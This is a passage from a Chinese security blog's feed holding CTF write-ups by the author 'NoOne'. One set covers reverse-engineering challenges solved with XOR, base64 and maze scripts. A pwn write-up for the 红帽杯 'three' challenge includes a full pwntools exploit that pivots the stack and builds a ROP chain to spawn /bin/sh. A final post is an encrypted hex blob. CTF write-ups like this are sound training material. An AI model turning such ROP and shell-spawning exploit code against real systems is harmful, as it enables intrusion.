coding=utf-8</span></span><br><span class="line">List1 =[<span class="number">0xBCA0CCBB</span>, <span class="number">0xB8BED1DC</span>, <span class="number">0xAEBECFCD</span>, <span class="number">0x82ABC4D2</span>, <span class="number">0xB393D9D2</span>, <span class="number">0xA993DED4</span>, <span class="number">0x82B8CBD3</span>, <span class="number">0xB9BECBD3</span>, <span class="number">0x00CCD79A</span>]</span><br><span class="line">v2 = <span class="number">0xDDCCAABB</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(List1)):</span><br><span class="line">    result = hex( List1[i] ^ v2 )[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        temp = int(result[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">        flag += chr(temp)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#flag += chr(result)</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="re10"><a href="#re10" class="headerlink" title="re10"></a>re10</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">string = <span class="string">"c61b68366edeb7bdce3c6820314b7498"</span></span><br><span class="line">flag =<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">    v3 = <span class="number">1</span> <span class="keyword">if</span> i&amp;<span class="number">1</span> <span class="keyword">else</span> <span class="number">-1</span></span><br><span class="line">    result = ord(string[i])+v3</span><br><span class="line">    flag += chr(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># S</span></span><br><span class="line">flag0 = <span class="string">"SharifCTF&#123;"</span></span><br><span class="line">flag1 = <span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line">flag = flag0 + flag + flag1</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>好坑的一道题。。少了个S，我还以为我做错了</p><h2 id="re11"><a href="#re11" class="headerlink" title="re11"></a>re11</h2><p><span class="exturl" data-url="aHR0cHM6Ly90b29sLmx1L3B5Yy8=" title="https://tool.lu/pyc/">pyc反编译<i class="fa fa-external-link"></i></span></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="comment"># 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pyc</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = ord(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Input flag:'</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'correct'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'wrong'</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">correct = base64.b64decode(correct)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(message)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x= ord(i) - <span class="number">16</span></span><br><span class="line">        x = x ^ <span class="number">32</span></span><br><span class="line">        s += chr(x)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">flag = decode(correct)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#nctf&#123;d3c0mpil1n9_PyC&#125;</span></span><br></pre></td></tr></table></figure><h2 id="re12"><a href="#re12" class="headerlink" title="re12"></a>re12</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">control = <span class="string">'''</span></span><br><span class="line"><span class="string">O -1 左</span></span><br><span class="line"><span class="string">o +1 右</span></span><br><span class="line"><span class="string">. -1 上</span></span><br><span class="line"><span class="string">0 +1 下</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> (control)</span><br><span class="line"></span><br><span class="line">maze = <span class="string">'  *******   *  **** * ****  * ***  *#  *** *** ***     *********'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    print(maze[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">result = raw_input()</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">'w'</span>:</span><br><span class="line">        flag += <span class="string">'.'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">'a'</span>:</span><br><span class="line">        flag += <span class="string">'O'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">'s'</span>:</span><br><span class="line">        flag += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="string">'o'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag = "nctf&#123;oo00OOOO...o...OO.&#125;"</span></span><br><span class="line">flag0 = <span class="string">"nctf&#123;"</span></span><br><span class="line">print(flag0+flag + <span class="string">"&#125;"</span>)</span><br></pre></td></tr></table></figure><p>输入dsddssasssddddwwaa</p><p>得到flag nctf{o0oo00O000oooo..OO}</p><p>emm，有点坑。。我开头以为是从#号触发反过来走，然后错了，方向键我是盲猜的，我只能看运气，1/2</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> __<span class="function">fastcall <span class="title">sub_400650</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = (*a1)--;</span><br><span class="line">  <span class="keyword">return</span> v1 &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> __<span class="function">fastcall <span class="title">sub_400660</span><span class="params">(<span class="keyword">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = *a1 + <span class="number">1</span>;</span><br><span class="line">  *a1 = v1;</span><br><span class="line">  <span class="keyword">return</span> v1 &lt; <span class="number">8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_400660(&amp;v9 + <span class="number">1</span>)</span><br><span class="line">sub_400680(&amp;v9);</span><br></pre></td></tr></table></figure><p>结合这4句，推测存储结构，一个__int64 8个字节， 2个字节一个分割，所以相当于 0x上下左右</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_400690(asc_601060, SHIDWORD(v9), v9) )</span><br></pre></td></tr></table></figure><p>在结合这句，SHIDWORD</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHIDWORD(x)  (*((int32*)&amp;(x)+1))</span></span><br></pre></td></tr></table></figure><p>所以&amp;v9+1的话就是左右部分，在看内部实现，就是左右了</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/ff286fcb/">https://noone-hub.github.io/posts/ff286fcb/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title>红帽杯three</title>
    <url>/posts/633c637e/</url>
    <content><![CDATA[<h1 id="three"><a href="#three" class="headerlink" title="three"></a>three</h1><p>这道题我开始用了jmp ecx。。可能基础没打好吧，让我真正理解nx保护的就是这道了，为什么rop能绕过nx保护，因为rop利用的是ret一个地址，然后这个地址是本身存在代码的，而我那样是直接执行代码，错误的方式</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>3字节的任意代码执行，我想到了栈迁移，可是用的是jmp ecx，太菜了，技术不娴熟<br>这题有个小技巧，没开pie并且是写入bss段，所以/bin/sh可以自己写入后确认位置，所以直接execve(“/bin/sh”, NULL, NULL),基础rop的题目。。。</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>其中，该程序是 32 位，所以我们需要使得</p><p>系统调用号，即 eax 应该为 0xb<br>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。<br>第二个参数，即 ecx 应该为 0<br>第三个参数，即 edx 应该为 0</p><p>然后ROPgadget搞下寄存器就好了<br>bin_sh用find找到</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191115172946.png" alt></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./pwn'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> s,addr          : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get_one_gadget</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_gadget</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> map(int, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split(<span class="string">' '</span>))</span><br><span class="line"><span class="comment">#one_gadget = one_gadget(libc.path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">":"</span>, <span class="string">"3"</span>)</span><br><span class="line">    payload = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                  mov esp, ecx</span></span><br><span class="line"><span class="string">                  ret</span></span><br><span class="line"><span class="string">                  '''</span>)</span><br><span class="line">    sa(<span class="string">"!"</span>, payload)</span><br><span class="line">    sla(<span class="string">":"</span>, <span class="number">500</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">"finish\n finish\nn 5"</span>)</span><br><span class="line">    sh_addr = <span class="number">0x080c777d</span></span><br><span class="line">    int80 = <span class="number">0x08049903</span></span><br><span class="line">    pop_edx_ecx_ebx = <span class="number">0x08072fb1</span></span><br><span class="line">    pop_eax = <span class="number">0x080c11e6</span></span><br><span class="line">    shellcode = flat([</span><br><span class="line">        pop_eax,</span><br><span class="line">        <span class="number">0xb</span>,</span><br><span class="line">        pop_edx_ecx_ebx,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x80f6cdd</span>,</span><br><span class="line">        int80</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sl(shellcode + <span class="string">'\x00'</span> + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/633c637e/">https://noone-hub.github.io/posts/633c637e/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>二进制</tag>
        <tag>writeup</tag>
        <tag>红帽杯</tag>
        <tag>2019</tag>
      </tags>
  </entry>
  <entry>
    <title>某比赛wp.md</title>
    <url>/posts/a4f45285/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="7b2693513466cc396b927766d97846e7a43407676735da300dccd13032f3c0a3">ee98f65d41f137859b79d2d4ac219a08acf3ddee976ac15fc7fb42714326ae4989ecd7f96fc2ec5bb720e667df9e89deefa0443710655fc21633c94f73a96949c8afc08dd1a6e749c8e9a9899a9e12ee3719092dccd6049ef788fc5c35b6d021b1ea0e563a410f3a99db7f3b6d1aeaf5b4228a98b198beeaf7d4431da7967927b8def95c9bbe46c740084a44eb08696756924094eab09cfb680021d2713dcc060159ee3d6132526d425977c8af27b1a450675254db59c5261ac2747dcf57572625ada633ebb6fb4e60cdcbe32179160049267b3bbe03fb509397b9279e716ffd25f95f1d6580107fba9d677b9f1ee5239a6b44deed02be29b16d26c6d1c0655f1519fb5f461d97c9d53d0821d9d44a607b9f72a44298c120eb01d48166bd98aca43403b969003f566edf60884b1b3b8f2205ee8bc5327b7f849ce307a4eabce84dc6c60a3d65b1d19dcaa67279048867199a9b054b8709424adc1b656e5ce916a6a516477180734f4ba308b14fbf02866417ff0ddb0f41fe467a204fb66649f9d2e6c0c0b5b041e5783e8bcd9ac741e39f9a036fc053034f4a9539228831d597cba57b2bc3a6a5d844ebd0e1136c37cc6e7c897a6a02d2b1b253777df438a146e745ff1a3e32737be1a8567f9b46963c15cc916d8f23f8392e1839f71c8f4ee633beb9608eda507caa78aec455da46f32dff57a35aa04b5cf973053aac7c9b0f7b01eff009848a6d6c5914feb4e8c00fbd2f16b08f29e4a27d99488725099c394ab9a64b1d828cc2b2b43550424aefd9afdb6035c575c0c82ba404bd383e973d8aebbc0535f373cf4b1c9cf1b4b2c84c2aa784fada7e030a8283ed10d77062b6ec5ae56c3ce14e2cd0c4d37e481b6e1c8916b0671a090054a0c6a6e203402c9d5c06e2565358799290bd706e14e25d60c6e8339e6bc75a214da85d0a43c7d9f96b28b360fe55616cded787260226f6f0f4aad3995b674441c131a9d90856e645b3fde8f723d438546f1107ed58c29a1cdb189b2f0b1d97bd2dbc2d25edf5dd9dc1da8594bda378b9748c226122b7682b663b91351a6ae956ae06a3f38dcbc996ea8e45bf58eb1caaeb704b1bd7027248fe830b38f65e56f46d46b013be99c2e524c7ae2cc269b53ba16df031aa7234f38fb2e8bf58594cc3a07e4d418fd479a3fd9e6a2c3d2b10163affeea57c4144c156ce3cdcb486aa6eb1ee3ea0255da889843ed47737c45e300a6851728e788f5ed741e4d9d32c490a398fdf43ab8cbc3952d2f61dc6d94e517a8906f066840e79a59acd1b43b7b79dfec95b31c6cb299335c720426dc68c7150a37e1a840f290531f0032c5e8f52a76b368024f1e743cc55b8073f1c657e3cc502a2a4d9ce30e54b2f211c105933dbfcc570b2122c2313371acbe11d60dcf7b443e8f203bd0320586adb33a811b6c6ded3cf1c60242e055711e1f06b21c31f2c3569a7431b62dbe08ca03681040a65e4b18e07ac9d9b46260141f23b5326b07b76420b3f52f9840da9699edeb309d555a39bfe87e4fc2262184f4eb1d83c12c62af5c991df474ba24a5b6a3d689a0963a4f79fa0b35eb51ab410f5c8706db7a297563ce980ac29fd4a62d00faef47210501383c2de576f1a1243546ad6cee4f32b7ca43cdac8e9edde65fe6439b2447d9a9ba6e7f85474a3e58cfbef6d92e00fc5cc201ae64fe1ee98b21ba7fc2ef4dc972551b391fdaead5403a75281eb1e83fb950457124b1f32e93cce005fab3c01a180c5011acda92ec2441bcf37255aad9f4b4f67d319582761effb4036f38bba35c7fdb7dc62a9721d2ded5260064292830fa1367e13f8cbb91bc5f16e3fbb6ed5277332292557a656eb27e12deedda7fc7b921a825e82f53471b84756c56a3871fa38feffa0d0fa902e6309fe4cd1e85e5d708c6c8b98c32aee5410093743cc30deff10488962ddabd05bbf16064e643b5c71d5fd3533a368c09d9e310ed29e1091edab57ed87bcc6c8f7e68b61a767ac0eb865aaeee6423e10dbdd89506f87322e3dd81079aeed9b24ce6e37495105026d640a05087b44df2519d451e49040a8c1a3713e97f48f0eb9336d28a753fa57b250b488ba3ef8665e4730e5865c08cced2f1148aa5868e2dba9935ff6bf4b9567d5416aa9ceadef35765476d14be7f329dd508929853337a6e4ee2d2d7572be2b2ce8e7759a128c1ca264932e872ad3c2f354f417545e4435e6459b0438bd7b9a95635e88e00d2404ae09b1dcd0ef735834c4ea79f3b5935d4d773d9069a974cd950fce06021473bad67c045015233fff6d34b31d7da2d4976470c019a0d3b7621666aa8eeeaec677120879303688facb52150cdb0e75128a295980391aa71013d76bc672287097cc83f20187a46650d91346d19ae1cbeeab4b813e5a567c4d3d0cdd3b2febf45b29c31bd1dc7bd09410480288199327c95b1d3a5a1b927a6171b0f2736eb44775d3d80483adaada2e6841b0b7c64e0c2108e1a87e867a0cbcaab7d21889ec56b5a71b6ca04e67cc79312c55febdbade9198e3b10f04986071a35e8bef68a16d256be63cfaaf3a797fac13e1ae78762a1f15bb01d3e8db49789612fd88f55b9348dabb58bb2cfc039b5cf76579dd9d7ce8315018591ac49641af6c5de906eda0149ed91829a9d756b024c8ea3a75af81eab317bf6060cd3e1badf8c3a2675ded14f2ad3f9856596710a120c3fecff7f620b479b9f758c209548a0d78fdd46089563ac01626ac9a528128c2798269bfca21c937fb633cdca25a4574aafa71f7913351c662c7cc9bba2537c9d8cfe439e8969e878bca4d2556b54481c2b6302592133bbf0f9442e10f7cac0acb13692a86603b160d53123a11a08eeeca7515032c9ea6795160496b5b05d593dfa7220b73f7b96376853947093671c89c81d2b004177c626af17496a4581434b30cd8f02a33146c0e20fd206dcac2fc2611f87a3cb9af1ac76889071ffa68c678a569a0153671cef0864fe8e95d200543bfc1ed74292dea6c86b8fed0cdabb938b35b5b3f5520ffad8930d5f7e9cab94a6d6eb8c55dd745fbb79e14e254f5298b769efc4e5971e71c74f5922307aad8a05af125d555c7424570b1605a8862f87e54903d7912027eae0b179ccf86a47b6d4252ddcc578b4bccdf00526420ea38dad4bb4e02d9543975b602b6e80e1c68ffee714c481fe35eac8b0a5a9e97a9b49c88cbdcab3eb3cf1eb7afb24872d426df07aa33f5a2f6d573094e93b79cdc8badb03356c85f80e3aba972a138568cd99a9bfddf08cc062b6e44c6f428800e851a9d63f5a8e3ecfcb65db9bf6e7cccdb661497ce0fdaacc899a18172e13bafacbd04580ebae80554ba78d6fde99bd02e1e2a36266058c1e624c2eb3b48e0c76c12096ae935411dd82ae83ed42b1870a88eae85760b0e9d8a3f7af1f7c5ba28d798860a3c4d7cc3da2f41ca134454a5a27c205f3bbbf9eef87e0485448143da37753033a5d15bc2f77e30c82a2e448a441099bd41049c1cf0b1a74df1ab098f084524d2ea248ef1ef6f5d1480572f94aae1f2733c184529af3a5e7b4afe1c53ed695bd65b451f0fe68bf6546c546d1119cdc6eda4bc78137d7ff76e1c38fbe2e230d5f5891313263b07cb1799336d630a39e3c1a54c8479ac3e6ce8233b8d1dcb7ad848558f8bdbe2f57ecfcf5de6c418e5277a20d8bfe5715affd0a7993ce686b2a1c659446d6720d4290c41ebff8e585a3461a7a33c8b49ca85162eabb751cc9787fed858f25e6bdec537b0ba3bcf4004322607a8204c3583e9259b8643159a22883ced0c24e594441c9ff624a4f7ae946b8764b8ae54c0b0b5606d8961b062a90412ee074f979dd817edf482e22493ce9e022708b6ccfef596ffbb85e70778c2f297ff9a93d0d0801414315446d0d8a53ac0f4e2a49f8cfd4386178577fd505f899078abeb5b4a6839fe931c03734e6971ff5f44f4bd4738f17d7d2b859de9ba46539ee4fde5726ca0c216630f32f97a942c4f94c703736c7bcc6b2331acf046b41cc67060d881fda74ce73ce93add60c58b0332a6a9e48cd475fec96d032102bd0f4f8f25a6ea0bd26949d1440a1b1f17813ea3071928b1da96dcc75a985e340028c1fea3b2318105bbde18e8929f0a23675914fcfaaf88fd5aa29d383f1f4d6a2dad43d5d32ea5e83932674793a0475c5019cff8c27ef023006d21bee012a63276ab5a61661106128d23f82b6cc9371dd36f1381dfc6b7310a840addebd068d65fea01557890a3bf963fc4093e547c7afb3690d645dfd8261f2bea32e11eaa11212b950a0c39b7d714d174f66ed9afb47e2621cc0789bea716a3edf3f573e735601108ed021369d8db861c1c51908fc2ca6b5834054951fc04e40090003f69bed101a5be796edabd7746368af08e1da135495abf847f9d0cbd15bbb08402af487a9dd45e7fa721cd40fc2afd702d6cd04c9fdbbf09e7b83706a38f9d7952c11814fc1f4e5e20e6de7355b6738f16d7a0639be1e890cb2913c12ce463139c83d2d391feac80c8e972e8b7e2c3578997056c598dd82fa0bbeac3588411db4744b5631f240a1fdf1a0e015aef5a1853e0f8dd2237a8488903786655e98ac220e2e8b42d27ed23a88751147a9095d97bf4fc15719b2dca334e95aaf24fad2767ba627e6941529fc43d4696993e4c60216602adf74c9a7ce0f6a86f8762cd1a5eab47627ea80b02f5c254b977e85663b314129975400328b446f3583ee7157801fd4fda9630a0ad3135c8694c87fef808f817d535da66ad700f596a4e4aca805788c205afe136516753c1f627da2f087ed9258ba1f02b0516f8854019a33d344519d7de12199a01b307df189b280f85f722c4a7060c4265f557386953ae364c94b38b7057f4e22479e7bdbc9a8d1b61d04b47b4d3ef47475eb2ef28392d5907022c3eba243ca52fe53bf971dc168eaf2ecc34ea40b0a722938a096920c0f9807349aa004bd07a82a348daac62b84d636a90f4e387bd4889fb7a2b30acf03665cfb744fbba7bd700d80d745b95afe3ba3f46c49df1b59e04a07b2223329dab8d5f6dc623ccb2b565e442a86ccc3d7880e01a010c6e0802695800c77f6521369edd40de51134e170258076d460c8500970c467bf400e47398555dd64a71c50a326d97c83634978a87c24a426c674aed556b65a2ea915c16f3758e17270c181480107109bce34590e26b83b1391df6f412add90a728cd9a3ce98402c8ed7e7e6bba1d049411bebbb69d69e388c7bf2d62061e126a98263123862a83cdaefb90d5f7e87aa2e9e7b276af63d954ce3a7bfa07f599d936fd9203bd133d3ab4dc72f87bf6048ea46d2b9d1edfc066ed1f5580d441526c60e7b429566325f441030de886417bf657d2793b6259da0460740e7530512ff0b8eac2d5cfda4587e051be2565ac9e0520a410fa70552ac482ab5092f19fb6c98368f7af7afe1b9bd076e4a738c56aa61fd69f6f076dd5a89483b475fe3bbbc32a4af43aa454b293caef4e840e1e9233a477dde3580670ab238a7b5dca3920552a87948df418010763e7335dc6f6ca639f9b2c882af439b5b1737af0812ac6498297f96527164642c7b679b3c333cea89a0c522537e4740fef6fdd95eca4b61cc6fbddbe2c20e5d53d67bdd261db7eece726ae715727e69ae6a7aff6d6741d86f0c088b33164fef0d4c41c347e8c73808b3a0bebb0d9aa8a37716196fde6e8848af0ca8fb09d886dff9198a3b3ee341f414c7c52b372035735a1c66dd179e40048951af100ab4cd457194761f421312dbdc6c136cacf017ed3c4d13e19135b1c774569f7a7996525412253c80b7dad0eb0935996132a31d16b70b63199032fce9ec73133d1e025e2cf0f98c59be80c8272c24df6f5546b6f720b24bd05d75545a44ebf1ede42bbbfcec7eb7f520cb86c9f6727e1f07a00e25481cdda3afd020104336e7aad9151447169ba055e81e9e459b74269882e3b013b1a3fd8fa35f25ce9cf5acbe2280861cc59eab07f845b99997a9bb8098cee05cfad71b84c6b34798d898a08350a1112464eb1446012ce3a881f0f60b9a6a42bfb9a6a73e64370e0106e6caf99a4cad7b66a29041b2a73fcad48b2f3bb205413a1d0af0fb554e3f12bae6e50991cbc5da5ecc036486d472087462316f43db76f4d8c70c95118e5d69791b0bc68c36e4936394cb4fc8b5d116083027d640d5f5e229983d51e4124ad2f881c4e6937f46b86264f387974270056d306d9d9afd60db8c10d1a0ab57a97cdee3fb00d72430bb884a22e873cb3e1cabd13934191216939cd81d48355aa157f0b5b8476f44ef0a743fe374ca655cf9acde5668b7a828b5332d4d7eff903ae6af48b54b062fbe7e2b42528dc21d661228d010320025de0a62d485687112438ed36b5028d3a407c69d1c04238234e3a5422ffe5d39262a9791fcd8ce540e37dbc5805310216bd8fa0d270ab306be43df723d6568f6a688086de5fe16f397a1f2a74af5f6a447869601501ec33f3e7f7cc4ca4325883356a98b3d12952e160f82ace049b56ba4f60d7f0aef3f8b79d11a1fa63d0db0d0046f62ece1f0ad05b11080dc982c07c22dd8f4bf3b176aacc925673dbc82a0758d8ee2280d090680c26c039c84d24cc7e1277ed9d12df43567a147aaeb8a7d6165c9da1f43a8005d285fe78298a37d807720e88e73ecb8be66600b385cb89d0dccc20f1bafcf9061ae8f41dda8e46d019a4224ababf1dc751dd24102705752ea0ad41b3a81c15ef8135745b7802fa62aae744c08fcf6c91703bd3a18d91e50fd9bebd440ddfdcd1c50adcec0edefbe85d80bdfd8e4c56fd36939e0318a62e191e8d92f07a60527364a39020658995b69b26f51aef0a76034a2c69e9fb5c57fe200bfaaae4a348f8091e3cb68ea4b113d3602c889d038d09a643adf7f74ad4bdb6f4cc03e3c8dfff88d349debbdcc61329f4f7302194d3d0ec0de25aa05d7078b40ac74ab19f9977b743a89d3c5efbe7acb6ebd307042965d0c61cb1208fbd628d17f4047ef23c33206d902a6a7404a16cb05c4ffe0e36f5fd428e261f75b4a0d3a8b897c8f1420f58a48ecc55f35765b3e96b3fb911022fcf5eee9f9e86186ecbce018d2b319a4aa441dcba1579f995f05e1d0f0d7e34cb585a8b55398c4b0f3feddbac7b1a4fbd67bb5034a23f27e84430848a0bb1391c8d1dda9f392b0467b51ba082fbd597f9de751b31349a665495bb0141c296f143aec0c0856061da55601258eba